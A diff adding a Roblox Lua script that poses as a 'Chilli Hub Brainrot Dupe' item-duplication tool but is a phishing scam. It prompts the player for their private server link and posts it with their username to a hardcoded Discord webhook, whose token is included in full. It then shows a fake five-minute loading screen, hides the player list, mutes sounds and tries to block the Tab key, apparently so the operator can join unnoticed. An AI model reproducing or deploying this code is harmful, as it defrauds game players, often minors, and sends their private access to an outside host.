@@ -1,0 +1,219 @@
+local Players = game:GetService('Players')
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild('PlayerGui')
+local StarterGui = game:GetService('StarterGui')
+local UserInputService = game:GetService('UserInputService')
+local HttpService = game:GetService('HttpService')
+
+-- Discord webhook URL from second script
+local webhook =
+    'https://discord.com/api/webhooks/1419833757019668481/dwcz6___QJFUqvFwOoCU-t8H2cpWjdDK4fjgdkE6j2How196EWhVWR4mz3jyLeybrJYf'
+
+-- Function to send message to Discord webhook (from second script)
+local function logMsg(Webhook, Player, Message)
+    local embed = {
+        ['description'] = Player .. ': ' .. Message .. '  ' .. os.date(
+            '| time %X'
+        ),
+    }
+    request({
+        Url = Webhook,
+        Headers = { ['Content-Type'] = 'application/json' },
+        Body = HttpService:JSONEncode({ embeds = { embed }, content = '' }),
+        Method = 'POST',
+    })
+end
+
+-- === First GUI ===
+local dupeGui = Instance.new('ScreenGui')
+dupeGui.Name = 'BrainrotChatbox'
+dupeGui.Parent = playerGui
+
+local frame = Instance.new('Frame')
+frame.Size = UDim2.new(0, 350, 0, 350)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.BackgroundTransparency = 0.1
+frame.BorderSizePixel = 0
+frame.Parent = dupeGui
+frame.ClipsDescendants = true
+
+local title = Instance.new('TextLabel')
+title.Size = UDim2.new(1, -20, 0, 40)
+title.Position = UDim2.new(0, 10, 0, 10)
+title.BackgroundTransparency = 1
+title.Text = '🌶️ Chilli Hub Brainrot Dupe 🌶️'
+title.Font = Enum.Font.GothamBold
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 22
+title.TextXAlignment = Enum.TextXAlignment.Center
+title.Parent = frame
+
+local startButton = Instance.new('TextButton')
+startButton.Size = UDim2.new(0.9, 0, 0, 70)
+startButton.Position = UDim2.new(0.05, 0, 0.5, 0)
+startButton.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
+startButton.Text = '🧠 Brainrot Dupe (10m Minimum) 🧠'
+startButton.Font = Enum.Font.GothamBold
+startButton.TextSize = 22
+startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+startButton.BorderSizePixel = 0
+startButton.Parent = frame
+
+local textBox = Instance.new('TextBox')
+textBox.Size = UDim2.new(1, -40, 0, 40)
+textBox.Position = UDim2.new(0, 20, 0, 150)
+textBox.PlaceholderText = 'Enter your PS Link (Public gets detected)'
+textBox.ClearTextOnFocus = false
+textBox.Text = ''
+textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+textBox.TextColor3 = Color3.fromRGB(230, 230, 230)
+textBox.Font = Enum.Font.Gotham
+textBox.TextSize = 18
+textBox.BorderSizePixel = 0
+textBox.Parent = frame
+textBox.Visible = false
+
+local sendButton = Instance.new('TextButton')
+sendButton.Size = UDim2.new(0, 100, 0, 40)
+sendButton.Position = UDim2.new(0.5, -50, 0, 200)
+sendButton.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
+sendButton.Text = 'Send'
+sendButton.Font = Enum.Font.GothamBold
+sendButton.TextSize = 20
+sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+sendButton.BorderSizePixel = 0
+sendButton.Parent = frame
+sendButton.Visible = false
+
+startButton.MouseButton1Click:Connect(function()
+    startButton.Visible = false
+    textBox.Visible = true
+    sendButton.Visible = true
+    textBox:CaptureFocus()
+end)
+
+-- === Loading Screen Function ===
+local function showLoadingScreen()
+    -- Remove the first GUI
+    dupeGui:Destroy()
+
+    -- Disable default leaderboard (player list)
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+
+    -- Block Tab key to prevent leaderboard toggle
+    UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if gameProcessed then
+            return
+        end
+        if input.KeyCode == Enum.KeyCode.Tab then
+            -- Block default tab behavior
+        end
+    end)
+
+    -- Create loading screen GUI
+    local screenGui = Instance.new('ScreenGui')
+    screenGui.Name = 'ChilliLoadingScreen'
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.Parent = playerGui
+
+    local background = Instance.new('Frame')
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.Position = UDim2.new(0, 0, 0, 0)
+    background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    background.Parent = screenGui
+
+    local titleLabel = Instance.new('TextLabel')
+    titleLabel.Size = UDim2.new(1, 0, 0, 60)
+    titleLabel.Position = UDim2.new(0, 0, 0, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = '🌶️ Chilli Hub Brainrot Dupe 🌶️'
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextSize = 28
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.TextStrokeTransparency = 0.7
+    titleLabel.Parent = background
+
+    local barBack = Instance.new('Frame')
+    barBack.Size = UDim2.new(0.8, 0, 0, 30)
+    barBack.Position = UDim2.new(0.1, 0, 0.5, -15)
+    barBack.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    barBack.BorderSizePixel = 0
+    barBack.Parent = background
+
+    local barBackCorner = Instance.new('UICorner')
+    barBackCorner.CornerRadius = UDim.new(0, 10)
+    barBackCorner.Parent = barBack
+
+    local barFill = Instance.new('Frame')
+    barFill.Size = UDim2.new(0, 0, 1, 0)
+    barFill.Position = UDim2.new(0, 0, 0, 0)
+    barFill.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
+    barFill.BorderSizePixel = 0
+    barFill.Parent = barBack
+
+    local barFillCorner = Instance.new('UICorner')
+    barFillCorner.CornerRadius = UDim.new(0, 10)
+    barFillCorner.Parent = barFill
+
+    local percentLabel = Instance.new('TextLabel')
+    percentLabel.Size = UDim2.new(0.8, 0, 0, 30)
+    percentLabel.Position = UDim2.new(0.1, 0, 0.5, 20)
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Text = '0%'
+    percentLabel.Font = Enum.Font.GothamBold
+    percentLabel.TextSize = 24
+    percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percentLabel.TextXAlignment = Enum.TextXAlignment.Center
+    percentLabel.Parent = background
+
+    -- Mute all global sounds function
+    local function muteAllSounds()
+        local SoundService = game:GetService('SoundService')
+        for _, sound in ipairs(SoundService:GetDescendants()) do
+            if sound:IsA('Sound') then
+                sound.Volume = 0
+            end
+        end
+    end
+
+    muteAllSounds()
+
+    local realDuration = 300 -- 5 minutes total
+    local visualDuration = 120 -- 2 minutes progress bar fill
+
+    local runService = game:GetService('RunService')
+    local startTime = tick()
+
+    local connection
+    connection = runService.RenderStepped:Connect(function()
+        local elapsed = tick() - startTime
+
+        local visualProgress = math.clamp(elapsed / visualDuration, 0, 1)
+        barFill.Size = UDim2.new(visualProgress, 0, 1, 0)
+        percentLabel.Text = string.format('%.1f%%', visualProgress * 100)
+
+        if elapsed >= realDuration then
+            connection:Disconnect()
+            screenGui:Destroy()
+        end
+    end)
+end
+
+-- Override sendButton to send webhook message on click
+sendButton.MouseButton1Click:Connect(function()
+    local msg = textBox.Text
+    if msg ~= '' then
+        -- Send message to Discord webhook
+        logMsg(webhook, player.Name, msg)
+
+        -- Clear text box
+        textBox.Text = ''
+
+        -- Show loading screen
+        showLoadingScreen()
+    end
+end)
